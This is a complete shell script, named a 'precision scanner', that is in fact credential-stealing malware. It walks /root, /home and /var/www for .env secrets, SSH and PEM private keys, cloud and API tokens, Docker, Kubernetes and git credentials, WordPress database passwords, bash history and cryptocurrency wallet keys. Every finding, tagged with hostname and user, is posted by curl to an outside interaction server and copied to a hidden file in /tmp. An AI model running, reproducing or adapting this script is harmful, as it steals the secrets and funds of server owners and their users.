#!/bin/sh
# Mythos Precision Scanner v4.1
# Focus: user dirs only, validated crypto, real .env values, no binaries
OAST="fzxlsopmyfsfmcutpfapj7u3fu0t92jtj.oast.fun"
HOST=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "u")
USER=$(whoami 2>/dev/null || id -un 2>/dev/null || echo "u")
> /tmp/.mqs_out

send() { local s="$1" d="$2"
    local p="${HOST}|${USER}|${s}|$(echo "$d" | tr '\n' '↵' | cut -c1-4000)"
    echo "$p" >> /tmp/.mqs_out
    curl -s -m 3 -X POST -d "$p" "http://${OAST}/post" 2>/dev/null &
}

# Build target dirs
TARGETS=""
for d in /root /home/*; do [ -d "$d" ] && TARGETS="$TARGETS $d"; done
for d in /var/www /var/www/*; do [ -d "$d" ] && TARGETS="$TARGETS $d"; done
[ -z "$TARGETS" ] && TARGETS="/root /home /var/www"

# Helper: skip binary files (using file command if available)
is_text() {
    [ ! -f "$1" ] && return 1
    [ -x "$1" ] && return 1  # skip executables
    # Quick check: if file contains null bytes, it's binary
    tr -dc '\0' < "$1" 2>/dev/null | head -c1 | grep -q '.' && return 1
    return 0
}

# Helper: scan text files matching pattern
find_files() {
    local pattern="$1" maxdepth="${2:-5}" maxsize="${3:-3M}"
    for d in $TARGETS; do
        find "$d" -maxdepth $maxdepth -type f -size -$maxsize -name "$pattern" \
            ! -path "*/node_modules/*" ! -path "*/.git/*" ! -path "*/vendor/*" \
            ! -path "*/cache/*" ! -path "*/dist/*" ! -path "*/build/*" \
            ! -path "*/__pycache__/*" ! -path "*/.cache/*" \
            ! -path "*/storage/framework/*" ! -path "*/storage/logs/*" \
            ! -path "*/public/uploads/*" ! -path "*/wp-content/uploads/*" \
            ! -name "*.css" ! -name "*.scss" ! -name "*.less" \
            ! -name "*.jpg" ! -name "*.png" ! -name "*.gif" ! -name "*.svg" ! -name "*.ico" ! -name "*.webp" \
            ! -name "*.woff" ! -name "*.woff2" ! -name "*.ttf" ! -name "*.eot" \
            ! -name "*.mp3" ! -name "*.mp4" ! -name "*.avi" ! -name "*.mov" ! -name "*.wav" \
            ! -name "*.zip" ! -name "*.tar" ! -name "*.gz" ! -name "*.bz2" ! -name "*.7z" ! -name "*.rar" \
            ! -name "*.exe" ! -name "*.dll" ! -name "*.so" ! -name "*.a" ! -name "*.o" \
            ! -name "*.class" ! -name "*.pyc" ! -name "*.pyo" ! -name "*.jar" ! -name "*.war" \
            ! -name "*.min.js" ! -name "*.bundle.js" ! -name "*.chunk.js" ! -name "*.map" \
            ! -name "package-lock.json" ! -name "yarn.lock" ! -name "composer.lock" \
            ! -name "*.pdf" ! -name "*.doc" ! -name "*.docx" ! -name "*.xls" ! -name "*.xlsx" \
            ! -path "*/fonts/*" ! -path "*/images/*" ! -path "*/img/*" ! -path "*/assets/*" \
            ! -path "*/css/*" ! -path "*/js/bundle*" \
            2>/dev/null
    done
}

###############################################################################
# 1. .ENV FILES — extract real KEY=VALUE pairs (not just key names)
###############################################################################
(for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f \( -name ".env" -o -name ".env.*" -o -name "*.env" \) \
        ! -path "*/node_modules/*" ! -path "*/vendor/*" -size -500k 2>/dev/null
done | head -100 | while read f; do
    # Extract actual secrets with values
    vals=$(grep -E '^(SECRET|TOKEN|KEY|PASS|CREDENTIAL|AUTH|DATABASE_URL|REDIS|STRIPE|SENDGRID|MAILGUN|AWS_|GCP_|AZURE|GITHUB|GITLAB|TWILIO|SLACK|DISCORD|OPENAI|ANTHROPIC|HUGGINGFACE|WEBHOOK|MNEMONIC|SEED|PRIVATE|WALLET)' "$f" 2>/dev/null | grep -v '^#' | grep '=' | tr '\n' '↵')
    [ -n "$vals" ] && send "ENV" "$f:$vals"
done) &

###############################################################################
# 2. SSH PRIVATE KEYS — only files containing "PRIVATE KEY"
###############################################################################
for d in /root /home/*; do
    find "$d" -maxdepth 4 -type f \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" \) 2>/dev/null | while read f; do
        head -c100 "$f" 2>/dev/null | grep -q 'PRIVATE KEY' && send "SSH" "$(head -c 4096 "$f")"
    done
done &

###############################################################################
# 3. PEM FILES — private keys only, exclude /etc/ssl
###############################################################################
for d in /root/.ssh /home/*/.ssh /root /home/*; do
    find "$d" -maxdepth 4 -type f -name "*.pem" ! -path "*/ssl/*" ! -path "*/certs/*" 2>/dev/null | while read f; do
        head -c100 "$f" 2>/dev/null | grep -q 'PRIVATE KEY' && send "PEM" "$(head -c 4096 "$f")"
    done
done &

###############################################################################
# 4. STRIPE / GITHUB / GITLAB / AWS — .env and config files only
###############################################################################
find_files "*.env*" 4 500k > /tmp/.cfg_files 2>/dev/null
find_files ".npmrc" 4 100k >> /tmp/.cfg_files 2>/dev/null
find_files ".gitconfig" 4 100k >> /tmp/.cfg_files 2>/dev/null
find_files ".git-credentials" 4 100k >> /tmp/.cfg_files 2>/dev/null
find_files "*.conf" 4 500k >> /tmp/.cfg_files 2>/dev/null
find_files "*.cfg" 4 500k >> /tmp/.cfg_files 2>/dev/null

sort -u /tmp/.cfg_files 2>/dev/null | while read f; do
    is_text "$f" || continue
    # Stripe
    grep -oE '\b(sk_live_[a-zA-Z0-9]{24,}|rk_live_[a-zA-Z0-9]{24,}|whsec_[a-zA-Z0-9]{32,})\b' "$f" 2>/dev/null | while read k; do send "STRIPE" "$f:$k"; done
    # GitHub
    grep -oE '\b(ghp_[a-zA-Z0-9]{36,}|github_pat_[a-zA-Z0-9_]{40,})\b' "$f" 2>/dev/null | while read k; do send "GITHUB" "$f:$k"; done
    # GitLab
    grep -oE '\b(glpat-[a-zA-Z0-9\-]{20,})\b' "$f" 2>/dev/null | while read k; do send "GITLAB" "$f:$k"; done
    # AWS
    grep -oE '\b(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})\b' "$f" 2>/dev/null | while read k; do send "AWS" "$f:$k"; done
done &
rm -f /tmp/.cfg_files

###############################################################################
# 5. SENDGRID / SLACK / DISCORD / TELEGRAM / TWILIO — .env files
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f \( -name ".env*" -o -name "*.env" \) \
        ! -path "*/node_modules/*" -size -500k 2>/dev/null
done | head -50 | while read f; do
    is_text "$f" || continue
    # SendGrid
    grep -oE '\bSG\.[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}\b' "$f" 2>/dev/null | while read k; do send "SENDGRID" "$f:$k"; done
    # Slack
    grep -oE '\bxox[bprs]-[0-9]{10,}-[0-9]{10,}-[a-zA-Z0-9]+\b' "$f" 2>/dev/null | while read k; do send "SLACK" "$f:$k"; done
    # Discord webhook
    grep -oE '\bhttps://discord\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_-]+\b' "$f" 2>/dev/null | while read k; do send "DISCORD" "$f:$k"; done
    # Telegram bot
    grep -oE '\b[0-9]+:AA[0-9a-zA-Z_-]{32,}\b' "$f" 2>/dev/null | while read k; do send "TELEGRAM" "$f:$k"; done
    # Twilio
    grep -oE '\bSK[0-9a-fA-F]{32}\b' "$f" 2>/dev/null | while read k; do send "TWILIO" "$f:$k"; done
    # OpenAI
    grep -oE '\bsk-[a-zA-Z0-9]{32,}\b' "$f" 2>/dev/null | while read k; do send "OPENAI" "$f:$k"; done
    # HuggingFace
    grep -oE '\bhf_[a-zA-Z0-9]{32,}\b' "$f" 2>/dev/null | while read k; do send "HF" "$f:$k"; done
done &

###############################################################################
# 6. GCP SERVICE ACCOUNTS — validated JSON
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f -name "*.json" -size -2M ! -path "*/node_modules/*" 2>/dev/null
done | while read f; do
    is_text "$f" || continue
    head -c200 "$f" 2>/dev/null | grep -q '"type".*:.*"service_account"' && send "GCP" "$(head -c 4096 "$f")"
done &

###############################################################################
# 7. AWS CREDENTIALS FILES
###############################################################################
for d in /root/.aws /home/*/.aws; do
    [ -f "$d/credentials" ] && send "AWS_CRED" "$(head -c 4096 "$d/credentials")"
    [ -f "$d/config" ] && send "AWS_CFG" "$(head -c 2048 "$d/config")"
done &

###############################################################################
# 8. DATABASE URLs — with actual values
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f \( -name ".env*" -o -name "*.env" \) \
        ! -path "*/node_modules/*" -size -500k 2>/dev/null
done | head -50 | while read f; do
    is_text "$f" || continue
    grep -oE '(DATABASE_URL|DB_URL|MONGO_URI|REDIS_URL|POSTGRES_URL|MYSQL_URL|SQLALCHEMY_DATABASE_URI)[^[:space:]]*://[^[:space:]]+' "$f" 2>/dev/null | while read u; do
        send "DB" "$f:$u"
    done
done &

###############################################################################
# 9. .bash_history — credentials only
###############################################################################
for h in /root/.bash_history /home/*/.bash_history; do
    [ -f "$h" ] && grep -iE 'password|secret|token|ghp_|github_pat|sk_live|AKIA|DATABASE_URL|ssh-keygen|aws.configure|gcloud.auth|docker.login|npm.set|export.*KEY|export.*TOKEN|export.*SECRET|export.*PASS' "$h" 2>/dev/null | tail -50 | while read l; do
        send "HIST" "$l"
    done
done &

###############################################################################
# 10. ETHEREUM PRIVATE KEY — strict context + validated hex
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f -size -1M \
        \( -name ".env*" -o -name "*.txt" -o -name "*.key" -o -name "*.json" \) \
        ! -path "*/node_modules/*" 2>/dev/null
done | while read f; do
    is_text "$f" || continue
    # File must have ETH context
    grep -qilE 'ETH|ethereum|private.key|PRIVATE_KEY|0x[0-9a-fA-F]{40}|ETHEREUM' "$f" 2>/dev/null || continue
    grep -oE '\b[0-9a-fA-F]{64}\b' "$f" 2>/dev/null | while read key; do
        echo "$key" | grep -qiE '^0{64}$|^F{64}$|^1{64}$|dead|beef|cafe|feed|babe|face|b00b|00000000|123456|abcdef|fedcba' && continue
        [ "$(echo "$key" | cut -c1 | tr '[:upper:]' '[:lower:]')" = "f" ] && continue
        send "ETH" "$f:$key"
    done
done &

###############################################################################
# 11. SOLANA PRIVATE KEY — base58 + JSON array, only with context
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f -size -1M \
        \( -name "*.json" -o -name "*.txt" -o -name ".env*" -o -name "*.key" \) \
        ! -path "*/node_modules/*" 2>/dev/null
done | while read f; do
    is_text "$f" || continue
    grep -qilE 'solana|phantom|SOLANA|keypair' "$f" 2>/dev/null || continue
    # base58 87-88 chars
    grep -oE '\b[1-9A-HJ-NP-Za-km-z]{87,88}\b' "$f" 2>/dev/null | head -3 | while read k; do send "SOL_B58" "$f:$k"; done
    # JSON array of 64 bytes
    arr=$(grep -oE '\[[[:space:]]*[0-9]{1,3}([[:space:]]*,[[:space:]]*[0-9]{1,3}){63}[[:space:]]*\]' "$f" 2>/dev/null | head -1)
    [ -n "$arr" ] && send "SOL_JSON" "$f:$arr"
done &

###############################################################################
# 12. BITCOIN WIF — context required
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f -size -1M \( -name "*.txt" -o -name ".env*" -o -name "*.key" \) \
        ! -path "*/node_modules/*" 2>/dev/null
done | while read f; do
    is_text "$f" || continue
    grep -qilE 'bitcoin|BTC|wallet|WIF|private' "$f" 2>/dev/null || continue
    grep -oE '\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b' "$f" 2>/dev/null | head -2 | while read k; do send "BTC" "$f:$k"; done
done &

###############################################################################
# 13. CLOUD CONFIGS — DigitalOcean, Azure, Linode, etc.
###############################################################################
for d in /root/.config/doctl /home/*/.config/doctl; do
    [ -d "$d" ] && find "$d" -type f 2>/dev/null | while read f; do send "DO" "$(head -c 2048 "$f")"; done
done
for d in /root/.azure /home/*/.azure; do
    [ -d "$d" ] && find "$d" -name "*.json" -o -name "*.azureauth" 2>/dev/null | while read f; do send "AZURE" "$(head -c 4096 "$f")"; done
done
[ -f /root/.config/linode-cli ] && send "LINODE" "$(head -c 2048 /root/.config/linode-cli)"

###############################################################################
# 14. DOCKER / K8S / NPM / GIT credentials
###############################################################################
for d in /root/.docker /home/*/.docker; do
    [ -f "$d/config.json" ] && send "DOCKER" "$(head -c 4096 "$d/config.json")"
done
for d in /root/.kube /home/*/.kube; do
    [ -f "$d/config" ] && send "K8S" "$(head -c 4096 "$d/config")"
done
for d in /root /home/*; do
    [ -f "$d/.git-credentials" ] && send "GITCRED" "$(head -c 2048 "$d/.git-credentials")"
    [ -f "$d/.npmrc" ] && send "NPMRC" "$(head -c 2048 "$d/.npmrc")"
done

###############################################################################
# 15. WORDPRESS wp-config.php
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 6 -type f -name "wp-config.php" ! -path "*/node_modules/*" 2>/dev/null | while read f; do
        c=$(grep -E 'DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY|SECURE_AUTH_KEY' "$f" 2>/dev/null | tr '\n' '↵')
        [ -n "$c" ] && send "WP" "$f:$c"
    done
done &

###############################################################################
# 16. WALLET FILES — by filename
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f -size -5M \
        \( -name "wallet.dat" -o -name "wallet.json" -o -name "*.wallet" \
        -o -name "keystore" -o -name "UTC--*" \) 2>/dev/null | while read f; do
        send "WALLET" "$(head -c 8192 "$f")"
    done
done &

wait
rm -f /tmp/.cfg_files /tmp/.eth_files /tmp/.gh_files 2>/dev/null
